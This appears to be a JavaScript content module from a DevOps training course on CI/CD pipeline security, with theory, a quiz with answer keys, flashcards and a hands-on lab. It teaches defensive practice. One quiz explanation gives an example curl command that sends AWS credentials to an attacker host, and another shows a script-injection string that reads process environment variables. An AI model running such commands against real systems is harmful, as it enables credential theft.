window.K8S_CONTENT_EN = window.K8S_CONTENT_EN || {};
window.K8S_CONTENT_EN['cicd/pipeline-security'] = {
  theory: `
# Security in CI/CD Pipelines

## Relevance
CI/CD pipelines have privileged access to your production environment — cloud keys, registry tokens, kubeconfigs. A compromised pipeline can be more damaging than compromising the application. Supply chain attacks (SolarWinds, Log4Shell) showed that the pipeline is a critical attack vector.

## Threat Model in CI/CD

\`\`\`
Attack Vectors:

1. Secrets exposure
   Hardcoded secrets in code → contaminated Git history
   Secrets in CI logs → leak to third parties
   GITHUB_TOKEN with excessive permissions

2. Supply chain attacks
   Compromised dependencies (npm, pip, maven)
   Compromised third-party Actions/plugins
   Base images with malware

3. Privilege escalation
   Runner with excessive cluster K8s access
   Docker socket mounted in runner
   Overly permissive RBAC for CI ServiceAccount

4. Code injection
   Malicious PR executing code on runner
   Script injection via unsanitized inputs
   Secrets stolen via malicious Actions
\`\`\`

## Secrets Security

### Principle of least privilege for GITHUB_TOKEN

\`\`\`yaml
# By default, GITHUB_TOKEN has read/write permissions
# Always restrict — give only what the job needs

# LEVEL 1: Minimum permissions at workflow level
permissions:
  contents: read          # checkout (read)
  packages: write         # push to GHCR
  # Not listed = read (NOT none)

# LEVEL 2: Per job (more granular)
jobs:
  test:
    permissions:
      contents: read      # only needs to read code
      # no other permissions

  build:
    permissions:
      contents: read
      packages: write
      id-token: write     # OIDC for signing

  security-scan:
    permissions:
      security-events: write  # upload SARIF results
\`\`\`

### OIDC: Authentication Without Long-Lived Secrets

\`\`\`yaml
# Instead of storing AWS_SECRET_KEY as a permanent secret,
# use OIDC for federated authentication with the cloud

jobs:
  deploy:
    permissions:
      id-token: write    # REQUIRED for OIDC
      contents: read

    steps:
      # AWS: assume role via OIDC without permanent secret key
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # No aws-access-key-id or aws-secret-access-key!

      # Azure: OIDC with workload identity
      - uses: azure/login@v1
        with:
          client-id: \${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: \${{ secrets.AZURE_TENANT_ID }}
          subscription-id: \${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # No client-secret! Uses OIDC
\`\`\`

**How OIDC works:**
\`\`\`
GitHub Actions Runner
       ↓ (requests JWT token with claims: repo, branch, workflow)
GitHub OIDC Provider (token.actions.githubusercontent.com)
       ↓ (JWT with verifiable claims)
AWS/Azure/GCP
       ↓ (validates JWT, issues short-lived temporary credential)
Deploy with ephemeral credentials (expires in 1h)
\`\`\`

### Preventing Secrets in Logs

\`\`\`yaml
# NEVER: direct interpolation in scripts
- run: |
    echo "Password is \${{ secrets.DB_PASSWORD }}"  # APPEARS IN LOG!
    curl -u user:\${{ secrets.API_TOKEN }} https://api.example.com

# CORRECT: via env:
- run: |
    echo "Connecting..."
    curl -u user:\$MY_TOKEN https://api.example.com
  env:
    MY_TOKEN: \${{ secrets.API_TOKEN }}
    DB_PASSWORD: \${{ secrets.DB_PASSWORD }}

# CORRECT: mask values in logs
- run: |
    SECRET=\$(aws secretsmanager get-secret-value --secret-id prod/db)
    echo "::add-mask::\$SECRET"  # masks the value in subsequent logs
    echo "Value retrieved (masked)"
\`\`\`

## Supply Chain Security

### Dependency Review and Lock Files

\`\`\`yaml
# 1. Dependencies with pinned versions and lock files
# WRONG:
#   flask>=3.0.0  (floating version)
# CORRECT:
#   flask==3.0.0  (exact version)

# 2. GitHub Actions: check if dependencies have vulnerabilities
- uses: actions/dependency-review-action@v3
  # Fails if the PR adds dependencies with known CVEs

# 3. Pinning Actions by commit SHA (not by mutable tag)
# RISKY: tag can be overwritten
- uses: actions/checkout@v4

# SECURE: pin to exact SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
#   (equivalent to v4, but immutable)

# Tool to update SHAs: github.com/renovatebot/renovate
\`\`\`

### Image Integrity Verification

\`\`\`yaml
# Verify image signature before deploying
- name: Verify image signature
  run: |
    cosign verify \
      --certificate-identity-regexp="https://github.com/myorg/myapp" \
      --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
      ghcr.io/myorg/myapp@\${{ needs.build.outputs.digest }}

# Or via admission webhook in cluster (Kyverno/OPA)
---
# Kyverno: require signed images in cluster
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences: ["ghcr.io/myorg/*"]
          attestors:
            - count: 1
              entries:
                - keyless:
                    subject: "https://github.com/myorg/myapp/.github/workflows/*"
                    issuer: "https://token.actions.githubusercontent.com"
\`\`\`

### SBOM — Software Bill of Materials

\`\`\`yaml
# Generate SBOM from image for dependency auditing
- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    image: ghcr.io/myorg/myapp:sha-\${{ github.sha }}
    artifact-name: sbom.spdx
    output-file: sbom.spdx

- name: Attach SBOM to image
  run: |
    cosign attach sbom --sbom sbom.spdx \
      ghcr.io/myorg/myapp@\${{ steps.build.outputs.digest }}

- name: Scan SBOM for vulnerabilities
  uses: anchore/scan-action@v3
  with:
    sbom: sbom.spdx
    fail-build: true
    severity-cutoff: critical
\`\`\`

## Runner Security

### Self-hosted runners: risks and mitigations

\`\`\`yaml
# PROBLEM: malicious PR in public repository
# can execute code on your self-hosted runner

# MITIGATION 1: don't use self-hosted for public repos
# MITIGATION 2: ephemeral runners (destroy after each job)

# GitHub-hosted: each job in fresh VM — more secure
runs-on: ubuntu-latest

# Self-hosted with ARC (Actions Runner Controller)
# creates ephemeral runners in Kubernetes
runs-on:
  group: k8s-runners
  labels: [ephemeral]

# Configure ARC for ephemeral runners:
# runnerScaleSetName: my-runners
# maxRunners: 10
# containerMode: dind  (or kubernetes)
\`\`\`

### Environment restrictions on runner

\`\`\`yaml
# Don't mount docker.sock in CI runner
# (allows container escape)

# Instead of Docker-in-Docker with socket:
# Use Kaniko (Tekton), Buildx (GitHub Actions)

# Limit what the job can do:
jobs:
  build:
    container:
      image: node:18-alpine
      options: --cap-drop=ALL --security-opt=no-new-privileges

    # Don't allow internet access during tests
    # (prevents data exfiltration)
    env:
      NO_PROXY: "*"
\`\`\`

## Automated Scanning in the Pipeline

### Trivy integrated into PR

\`\`\`yaml
jobs:
  security:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
      pull-requests: write

    steps:
      # Docker image scan
      - name: Run Trivy (image)
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ghcr.io/myorg/myapp:sha-\${{ github.sha }}
          format: sarif
          output: trivy-image.sarif
          severity: HIGH,CRITICAL
          exit-code: 1  # fails the build

      # Source code scan (secrets, misconfiguration)
      - name: Run Trivy (filesystem)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          scan-ref: .
          format: sarif
          output: trivy-fs.sarif

      # IaC scan (Terraform, K8s manifests)
      - name: Run Trivy (config)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: config
          scan-ref: k8s/
          format: sarif
          output: trivy-config.sarif

      # Upload results to GitHub Security (Security tab)
      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy-image.sarif
\`\`\`

### Secret scanning with GitLeaks

\`\`\`yaml
      # Check that no secret was committed
      - name: Scan for secrets
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: \${{ secrets.GITLEAKS_LICENSE }}  # for private repos
\`\`\`

## SLSA: Supply Chain Levels for Software Artifacts

\`\`\`
SLSA Levels:
L0: No guarantees
L1: Documented build (has build script/config)
L2: Build in CI (auditable, not manual)
L3: Hermetically isolated build (verifiable inputs/outputs)
L4: 100% reproducible build

For L2+: generate provenance (attestation of the build process)
\`\`\`

\`\`\`yaml
# Automatically generate SLSA provenance
- name: Generate SLSA provenance
  uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0
  with:
    image: ghcr.io/myorg/myapp
    digest: \${{ needs.build.outputs.digest }}
    registry-username: \${{ github.actor }}
  secrets:
    registry-password: \${{ secrets.GITHUB_TOKEN }}
\`\`\`

## Common Security Mistakes

1. **GITHUB_TOKEN with excessive default permissions** — declare permissions: at workflow start
2. **Using Action tag (v4) instead of SHA** — tags are mutable and can be compromised
3. **Secrets in global environment variables** — exposed to all jobs, including untrusted
4. **Docker socket in runner** — allows container escape to host
5. **Not verifying image signatures** — deploying compromised image unknowingly

## Killer.sh Style Challenge

> **Scenario:** A security audit identified that your GitHub Actions CI/CD pipeline has the following issues: (1) GITHUB_TOKEN with write-all permissions, (2) AWS credentials as permanent secrets, (3) Actions not pinned by SHA, (4) no vulnerability scanning. Create a remediation plan with practical implementation.
`,
  quiz: [
    {
      question: 'Why pin GitHub Actions by commit SHA (e.g., actions/checkout@b4ffde65) instead of by tag (e.g., @v4)?',
      options: [
        'SHAs are easier to remember than tags',
        'Tags are mutable — an attacker who compromises a popular Action\'s repository can overwrite the v4 tag with malicious code. The SHA is immutable — guarantees you\'re running exactly that commit, even if the tag is changed',
        'Pinning by SHA is only a style preference, has no security impact',
        'Pinning by SHA is only necessary for private Actions'
      ],
      correct: 1,
      explanation: 'Supply chain attacks via GitHub Actions have happened: a malicious actor gains access to a popular Action\'s repository and overwrites the tag (v4, @latest) with code that steals CI environment secrets. By pinning by SHA, you guarantee that even if the tag is changed, your workflow continues to use the original commit. Tools like Dependabot and Renovate can automate SHA updates.',
      reference: 'Tool: `actionlint` validates workflows and can warn about Actions not pinned by SHA.'
    },
    {
      question: 'How does OIDC eliminate the need for long-lived secrets for authentication with AWS/Azure/GCP?',
      options: [
        'OIDC stores credentials more securely in GitHub',
        'GitHub generates a JWT token signed by them with workflow claims (repo, branch, trigger). The cloud provider validates this JWT via OIDC and issues ephemeral credentials (temporary IAM role) that expire after the job — without needing to store AWS_ACCESS_KEY permanently',
        'OIDC is just another name for OAuth2 — no practical difference',
        'OIDC only works with GitHub-hosted runners, not self-hosted'
      ],
      correct: 1,
      explanation: 'With OIDC: there\'s no permanent secret to steal. GitHub Actions generates a JWT with verifiable claims (which repo, which branch, which workflow triggered). AWS/Azure/GCP trusts the GitHub OIDC provider and issues temporary credentials via STS (AWS) or Workload Identity Federation (GCP/Azure). If the JWT token leaks, it expires in 1h and can\'t be renewed. If AWS_SECRET_KEY leaks, it\'s valid indefinitely.',
      reference: 'Configure in AWS: create IAM Role with trust policy that allows tokens from GitHub Actions OIDC issuer for your specific repository.'
    },
    {
      question: 'What is an SBOM (Software Bill of Materials) and why is it important in modern pipelines?',
      options: [
        'SBOM is a summary of Docker image size',
        'SBOM is a complete list of all software components (libraries, versions, licenses) used in the application — allows auditing which components have CVEs, verifying incompatible licenses, and quickly responding when a new vulnerability is published',
        'SBOM is only needed for commercially sold software',
        'SBOM replaces Python\'s requirements.txt file'
      ],
      correct: 1,
      explanation: 'When Log4Shell was disclosed in 2021, companies spent weeks trying to find out which of their systems used Log4j. With SBOM generated in the pipeline and stored with each release, the answer would be immediate: "which production images have log4j >= 2.x?". SBOM in standard formats (SPDX, CycloneDX) allows automated vulnerability analysis tools against the complete inventory.',
      reference: 'Standard formats: SPDX (developed by Linux Foundation) and CycloneDX (developed by OWASP). Both are accepted by tools like Grype, Trivy, and GitHub Advisory Database.'
    },
    {
      question: 'Why is it risky to use self-hosted runners with public repositories on GitHub?',
      options: [
        'Self-hosted runners are slower than GitHub-hosted',
        'Anyone can open a PR in a public repository and, if the workflow runs on the PR, the PR code executes on the self-hosted runner with access to secrets and internal network — a malicious actor can exfiltrate secrets or attack the internal network',
        'Self-hosted runners don\'t have access to GITHUB_TOKEN',
        'It\'s only a cost issue, not security'
      ],
      correct: 1,
      explanation: 'With GitHub-hosted runners, each job runs in a completely isolated ephemeral VM — even if code is malicious, it has no persistent access. With self-hosted runners in public repositories: an attacker can submit a PR with `run: curl http://attacker.com -d "$(cat ~/.aws/credentials)"` or scan the internal network accessible by the runner. The mitigation is: don\'t use self-hosted in public repos, or use ephemeral runners (ARC) that are destroyed after each job.',
      reference: 'GitHub recommends: "We recommend that you do not use self-hosted runners with public repositories" — official GitHub Actions documentation.'
    },
    {
      question: 'What is the risk of interpolating \${{ secrets.TOKEN }} directly in a `run:` command of GitHub Actions?',
      options: [
        'No risk — secrets are automatically masked',
        'The secret value is substituted by GitHub before sending to the runner. If the command fails and prints its input, or if there\'s a bug logging the value, the secret may appear. Additionally, attackers via script injection can use that value before it\'s masked',
        'Direct interpolation is the only way to pass secrets to scripts',
        'Interpolated secrets expire after 1 hour automatically'
      ],
      correct: 1,
      explanation: 'Interpolation `\${{ secrets.X }}` is resolved by GitHub before sending the workflow to the runner. This means the secret value appears in the substitution process and can leak in runner errors. Additionally, script injection attacks use unsanitized inputs to inject commands that read environment variables where secrets have already been placed. Using `env:` in the step, the secret stays in the child process\'s environment variable — more secure.',
      reference: 'Script injection attack: `github.event.pull_request.title` may contain `"; cat /proc/self/environ"` if directly interpolated in a run.'
    },
    {
      question: 'What is the SLSA framework and what does achieving SLSA Level 3 mean?',
      options: [
        'SLSA is an acronym for "Signed Linux Software Applications"',
        'SLSA (Supply chain Levels for Software Artifacts) is a Google/CNCF framework defining supply chain security levels. Level 3 means: hermetically isolated build (no internet access during build), provenance generated and signed by the build service (not by the developer), non-modifiable build — verifiable guarantees that the artifact came from the expected source',
        'SLSA Level 3 means the image passed 3 security scans',
        'SLSA is only relevant for open source software, not enterprise'
      ],
      correct: 1,
      explanation: 'SLSA defines an incremental path to improve supply chain security. L1: build scripted. L2: build in CI, provenance generated. L3: hermetically isolated build, provenance not falsifiable by developer. L4: reproducible build. The framework also defines specific threats (A-I) that each level mitigates. Major companies (Google, GitHub, CNCF) already adopt SLSA for their critical projects.',
      reference: 'Resource: slsa.dev — official documentation with templates and implementation examples for different languages and CIs.'
    },
    {
      question: 'How does the `permissions:` mechanism in GitHub Actions implement the principle of least privilege?',
      options: [
        'permissions: restricts access to the GitHub repository',
        'permissions: defines exactly which permissions the GITHUB_TOKEN has for that workflow or job — restricting access to only what\'s needed (e.g., contents: read for checkout, packages: write for GHCR push), preventing a compromised job from using the token to modify branches, issues, or other resources',
        'permissions: only works for workflows triggered by pull_request',
        'permissions: requires a separate GitHub app for each permission'
      ],
      correct: 1,
      explanation: 'By default (without declaring permissions:), the GITHUB_TOKEN has read/write permission for most repository resources. A compromised test job could use that token to create tags, modify releases, or write to protected branches. By declaring `permissions: contents: read`, the test job\'s token can\'t do anything beyond reading code — least privilege in action.',
      reference: 'Best practice: declare `permissions: {}` at workflow level (denies everything), then grant only what\'s needed per job. Documentation: docs.github.com/actions/security-guides/automatic-token-authentication.'
    }
  ],
  flashcards: [
    {
      front: 'Minimum privilege for GITHUB_TOKEN',
      back: '**Default: read/write for everything (DANGEROUS)**\n\n**Restrict in workflow:**\n```yaml\n# Workflow level (baseline)\npermissions:\n  contents: read  # secure minimum\n\njobs:\n  test:\n    permissions:\n      contents: read  # only checkout\n\n  build:\n    permissions:\n      contents: read\n      packages: write   # GHCR push\n      id-token: write   # OIDC/cosign\n\n  security:\n    permissions:\n      security-events: write  # upload SARIF\n      contents: read\n```\n\n**Permission reference:**\n```\ncontents          → read/write code, releases\npackages          → push/pull packages (GHCR)\nid-token          → JWT for OIDC auth\nsecurity-events   → upload SARIF (security)\npull-requests     → comment on PRs\nissues            → create/edit issues\ndeployments       → create deployments\n```\n\n**Audit:**\nSettings > Actions > General >\nWorkflow permissions → "Read repository contents only"'
    },
    {
      front: 'OIDC — authentication without permanent secrets',
      back: '**Flow:**\n```\nGitHub Actions Runner\n  → requests JWT from GitHub OIDC\n  → JWT contains claims:\n      sub: repo:org/repo:ref:refs/heads/main\n      iss: token.actions.githubusercontent.com\n  → sends JWT to AWS/Azure/GCP\n  → cloud validates and issues temporary credential\n  → deploy with credential that expires in 1h\n```\n\n**GitHub Actions (AWS):**\n```yaml\npermissions:\n  id-token: write  # REQUIRED!\n  contents: read\n\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v4\n    with:\n      role-to-assume: arn:aws:iam::123:role/deploy\n      aws-region: us-east-1\n      # No access-key/secret-key!\n```\n\n**Advantage over permanent secrets:**\n- No secret to steal\n- Credential expires in 1h\n- Audit log with full context\n- Can restrict by branch/workflow'
    },
    {
      front: 'Pinning Actions by SHA — supply chain security',
      back: '**Why pin by SHA:**\n```yaml\n# MUTABLE — tag can be overwritten\n- uses: actions/checkout@v4\n\n# IMMUTABLE — always the same commit\n- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n# (equivalent to v4.1.1)\n```\n\n**Real attack without SHA:**\n1. Attacker compromises popular Action repo\n2. Overwrites @v4 tag with malware\n3. All workflows using @v4 execute malware\n4. Secrets are exfiltrated\n\n**With SHA:**\n- Overwritten tag doesn\'t affect your workflow\n- You run exactly the commit you reviewed\n\n**Automate updates:**\n```yaml\n# .github/dependabot.yml\nversion: 2\nupdates:\n  - package-ecosystem: "github-actions"\n    directory: "/"\n    schedule:\n      interval: "weekly"\n```\nDependabot automatically opens PRs with new SHAs'
    },
    {
      front: 'Trivy in pipeline — scan types',
      back: '**3 scan types:**\n```yaml\n# 1. Docker image (CVEs in packages)\n- uses: aquasecurity/trivy-action@master\n  with:\n    scan-type: image\n    image-ref: myapp:v1.2.3\n    severity: HIGH,CRITICAL\n    exit-code: 1\n\n# 2. Filesystem (secrets in code)\n- uses: aquasecurity/trivy-action@master\n  with:\n    scan-type: fs\n    scan-ref: .\n    scanners: secret,vuln\n\n# 3. IaC configs (K8s, Terraform)\n- uses: aquasecurity/trivy-action@master\n  with:\n    scan-type: config\n    scan-ref: k8s/\n    severity: HIGH,CRITICAL\n```\n\n**Upload to GitHub Security:**\n```yaml\n- uses: github/codeql-action/upload-sarif@v3\n  if: always()  # upload even if scan failed\n  with:\n    sarif_file: trivy-results.sarif\n```\n\n**Results appear in:**\nRepository > Security > Code scanning alerts'
    },
    {
      front: 'SBOM + Cosign — image attestation',
      back: '**SBOM (complete dependency list):**\n```yaml\n# Generate SBOM\n- uses: anchore/sbom-action@v0\n  with:\n    image: ghcr.io/org/app:v1.2.3\n    artifact-name: sbom.spdx\n    output-file: sbom.spdx\n\n# Attach SBOM to image (verifiable later)\n- run: |\n    cosign attach sbom --sbom sbom.spdx \\\n      ghcr.io/org/app@\${{ steps.build.outputs.digest }}\n```\n\n**Cosign signing:**\n```yaml\n# Sign with OIDC (keyless)\n- run: |\n    cosign sign --yes \\\n      ghcr.io/org/app@\${{ steps.build.outputs.digest }}\n\n# Verify signature (at deploy)\n- run: |\n    cosign verify \\\n      --certificate-identity-regexp="github.com/org/app" \\\n      --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \\\n      ghcr.io/org/app@DIGEST\n```\n\n**In cluster — Kyverno automatically verifies\nsignature before creating Pods**'
    },
    {
      front: 'CI/CD pipeline security checklist',
      back: '**Secrets:**\n```\n[ ] GITHUB_TOKEN with minimum permissions:\n[ ] OIDC instead of permanent cloud secrets\n[ ] Secrets via env:, never directly interpolated\n[ ] No secrets in code (GitLeaks scan)\n```\n\n**Actions and dependencies:**\n```\n[ ] Actions pinned by SHA\n[ ] dependency-review-action on PRs\n[ ] Lock files committed (package-lock.json, etc)\n```\n\n**Build and images:**\n```\n[ ] Trivy scan (image + code + IaC)\n[ ] Cosign signing of image\n[ ] SBOM generated and attached\n[ ] Multi-stage build (no build tools in final image)\n```\n\n**Runtime:**\n```\n[ ] Kyverno/OPA verifies signatures on deploy\n[ ] Ephemeral runners for self-hosted\n[ ] No docker.sock mounted in runner\n[ ] Minimum RBAC for CI ServiceAccount in cluster\n```'
    }
  ],
  lab: {
    scenario: 'You will audit and fix an insecure GitHub Actions pipeline, implementing: least privilege with OIDC (simulated), Actions pinning by SHA, security scanning with Trivy, and code secret verification.',
    objective: 'Transform an insecure pipeline into a secure pipeline with all supply chain security best practices.',
    duration: '25-35 minutes',
    steps: [
      {
        title: 'Audit insecure workflow and create secure version',
        instruction: `Analyze a GitHub Actions workflow with security problems and identify all vulnerabilities. Create the corrected version with least privilege.`,
        hints: [
          'List all problems: permissions, secret interpolation, Actions without SHA',
          'Configure minimum permissions: for each job',
          'Use env: to pass secrets to scripts'
        ],
        solution: `\`\`\`bash
mkdir pipeline-security-lab && cd pipeline-security-lab
mkdir -p .github/workflows

# INSECURE VERSION (for analysis)
cat > .github/workflows/insecure.yml << 'EOF'
# INSECURE WORKFLOW - DO NOT use in production
name: Insecure Pipeline

on:
  push:
    branches: [main]

# PROBLEM 1: no permissions declaration = implicit write-all
jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      # PROBLEM 2: Action not pinned by SHA (mutable tag)
      - uses: actions/checkout@v4

      # PROBLEM 3: secret directly interpolated in script
      - name: Build and push
        run: |
          echo "Logging in with token \${{ secrets.DOCKER_TOKEN }}"
          docker login -u myuser -p \${{ secrets.DOCKER_TOKEN }} docker.io
          docker build -t myapp:latest .
          docker push myapp:latest

      # PROBLEM 4: AWS credentials hardcoded in global env
      - name: Deploy
        env:
          AWS_ACCESS_KEY_ID: AKIA123456789EXAMPLE
          AWS_SECRET_ACCESS_KEY: mysecretkey123456
        run: |
          aws eks update-kubeconfig --name myapp-cluster
          kubectl apply -f k8s/
EOF

# Analyze problems
echo "=== Problems in insecure workflow ==="
echo "1. No permissions: declaration (write-all by default)"
echo "2. actions/checkout@v4 — mutable tag, not SHA"
echo "3. DOCKER_TOKEN secret directly interpolated in run:"
echo "4. AWS credentials hardcoded in env:"
echo ""

# SECURE VERSION
cat > .github/workflows/secure.yml << 'EOF'
name: Secure Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# FIX 1: minimum permissions at workflow level
permissions:
  contents: read  # minimum: read-only

jobs:
  build:
    runs-on: ubuntu-latest

    # FIX 1b: specific permissions per job
    permissions:
      contents: read
      packages: write    # GHCR push
      id-token: write    # OIDC for authentication

    steps:
      # FIX 2: Action pinned by SHA (immutable!)
      # SHA verified at: github.com/actions/checkout
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        # equivalent to v4.1.1

      # FIX 3: no interpolated secrets - use env:
      - name: Login to GHCR
        uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d
        # pinned by SHA!
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}  # temporary token, not permanent secret

      - name: Build and push
        uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56
        with:
          push: \${{ github.event_name != 'pull_request' }}
          tags: ghcr.io/\${{ github.repository }}:sha-\${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # FIX 4: OIDC instead of permanent AWS secrets
      - name: Configure AWS via OIDC
        if: github.event_name != 'pull_request'
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        # pinned by SHA
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # No access-key-id or secret-access-key!

      - name: Deploy
        if: github.event_name != 'pull_request'
        run: |
          aws eks update-kubeconfig --name myapp-cluster
          kubectl apply -f k8s/
        # secrets accessed via env:, not interpolation
        env:
          CLUSTER_NAME: \${{ vars.CLUSTER_NAME }}
EOF

echo "Workflows created!"
echo ""
echo "Comparison:"
echo "insecure.yml: \$(wc -l < .github/workflows/insecure.yml) lines"
echo "secure.yml: \$(wc -l < .github/workflows/secure.yml) lines"
\`\`\``,
        verify: `\`\`\`bash
# Verify both files exist
ls .github/workflows/

# Verify secure.yml has permissions declared
grep -c "permissions:" .github/workflows/secure.yml
# Expected: 2 or more (workflow level + job level)

# Verify no secrets interpolated in run:
grep "secrets\." .github/workflows/secure.yml | grep -v "env:" | grep -v "with:"
# Expected: no results (all secret references are in env: or with:)

# Verify Actions are pinned by SHA (40-char hash)
grep "uses:" .github/workflows/secure.yml | grep -v "@[a-f0-9]\{40\}"
# Expected: no results (all pinned by SHA)

echo "Audit complete — secure workflow validated!"
\`\`\``
      },
      {
        title: 'Add security scanning and secret detection',
        instruction: `Add security jobs to the pipeline: vulnerability scanning with Trivy (image + filesystem + IaC), and secret detection with GitLeaks.`,
        hints: [
          'Configure trivy for each scan type (image, fs, config)',
          'Use if: always() for results upload even on failure',
          'Configure exit-code: 1 only for CRITICAL CVEs in images'
        ],
        solution: `\`\`\`bash
# Add security job to secure workflow
cat >> .github/workflows/secure.yml << 'EOF'

  security-scan:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # for SARIF upload

    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      # SCAN 1: Docker image vulnerabilities
      - name: Trivy - Image scan
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8
        with:
          scan-type: image
          image-ref: ghcr.io/\${{ github.repository }}:sha-\${{ github.sha }}
          severity: HIGH,CRITICAL
          exit-code: 1
          format: sarif
          output: trivy-image.sarif

      # SCAN 2: Secrets and vulnerabilities in source code
      - name: Trivy - Filesystem scan
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8
        with:
          scan-type: fs
          scan-ref: .
          scanners: secret,vuln
          format: sarif
          output: trivy-fs.sarif
          exit-code: 1  # fail if secrets found

      # SCAN 3: IaC misconfiguration (K8s manifests)
      - name: Trivy - Config scan
        if: hashFiles('k8s/') != ''
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8
        with:
          scan-type: config
          scan-ref: k8s/
          severity: HIGH,CRITICAL
          format: sarif
          output: trivy-config.sarif

      # Upload all results to GitHub Security
      - name: Upload results to GitHub Security
        uses: github/codeql-action/upload-sarif@1b1aada464948af03b950897e5eb522f92603cc2
        if: always()  # IMPORTANT: upload even on failure
        with:
          sarif_file: trivy-image.sarif

      # GitLeaks: detect secrets in Git history
      - name: GitLeaks secret scan
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}

  dependency-review:
    # Only runs on PRs — checks added dependencies
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write

    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Dependency Review
        uses: actions/dependency-review-action@5bbc3ba29137598d8838c5c0df8ada7bef5f5190
        with:
          fail-on-severity: high
          comment-summary-in-pr: true
EOF

echo "Security jobs added!"
grep "^  [a-z-]*:" .github/workflows/secure.yml | head -10
\`\`\``,
        verify: `\`\`\`bash
# Verify security jobs created
echo "Jobs in workflow:"
grep "^  [a-z-]*:" .github/workflows/secure.yml

# Verify Trivy has all 3 scan types
grep "scan-type:" .github/workflows/secure.yml
# Expected: image, fs, config

# Verify upload is always done (even on failure)
grep -B2 "upload-sarif" .github/workflows/secure.yml | grep "if: always"
# Expected: "if: always()"

# Verify security job permissions
grep -A 5 "security-scan:" .github/workflows/secure.yml | grep -A 3 "permissions:"
# Expected: contents: read and security-events: write

echo "Security jobs validated!"
\`\`\``
      },
      {
        title: 'Create security policy and validate with actionlint',
        instruction: `Create a security policy file documenting pipeline requirements, and validate the workflow with actionlint to detect additional issues.`,
        hints: [
          'actionlint can be installed with curl or go install',
          'Document the policy in SECURITY.md or .github/SECURITY.md',
          'Verify the secure workflow passes all actionlint checks'
        ],
        solution: `\`\`\`bash
# Install actionlint (linter for GitHub Actions)
curl -s https://api.github.com/repos/rhysd/actionlint/releases/latest | \
  grep "browser_download_url.*linux_amd64" | \
  cut -d '"' -f 4 | \
  xargs curl -L -o /tmp/actionlint.tar.gz

tar xzf /tmp/actionlint.tar.gz -C /tmp/ actionlint
sudo mv /tmp/actionlint /usr/local/bin/

# Validate secure workflow
echo "=== Validating secure workflow ==="
actionlint .github/workflows/secure.yml
echo "ActionLint: exit code \$?"

# Validate insecure workflow (should show problems)
echo "=== Validating insecure workflow ==="
actionlint .github/workflows/insecure.yml 2>&1 || true

# Create pipeline security policy
mkdir -p .github

cat > .github/SECURITY.md << 'EOF'
# CI/CD Pipeline Security Policy

## Mandatory Requirements

### Secrets and Authentication
- [ ] GITHUB_TOKEN with minimum \`permissions:\` declared per job
- [ ] Authentication with clouds (AWS/Azure/GCP) via OIDC — no permanent secrets
- [ ] Secrets passed via \`env:\` in steps, never interpolated in \`run:\`
- [ ] No hardcoded secrets in any file

### Third-Party Actions
- [ ] All Actions pinned by commit SHA
- [ ] SHAs updated monthly via Dependabot
- [ ] Only Actions from verified publishers (GitHub, Docker, AWS, etc.)

### Security Scans (required on every PR)
- [ ] Trivy image scan (exit-code: 1 on CRITICAL)
- [ ] Trivy filesystem scan (secret detection)
- [ ] Trivy config scan (IaC misconfiguration)
- [ ] GitLeaks for Git history

### Build and Images
- [ ] Multi-stage builds (no build tools in final image)
- [ ] Cosign signing for production images
- [ ] SBOM generated and stored per release
- [ ] Images based on verified base images

### Self-hosted Runners (if applicable)
- [ ] Ephemeral runners (destroyed after each job)
- [ ] Not available for public repositories
- [ ] No docker.sock mounted
- [ ] Minimum RBAC in Kubernetes cluster

## Review Process
Every new or modified workflow must be reviewed by:
- 1 member of the platform team
- 1 member of the security team
EOF

echo "Security policy created!"
cat .github/SECURITY.md

# Final summary
echo ""
echo "=== Pipeline Security Lab Summary ==="
echo "Files created:"
find . -type f -name "*.yml" -o -name "*.md" | grep -v ".git"
\`\`\``,
        verify: `\`\`\`bash
# Verify actionlint installed
actionlint --version

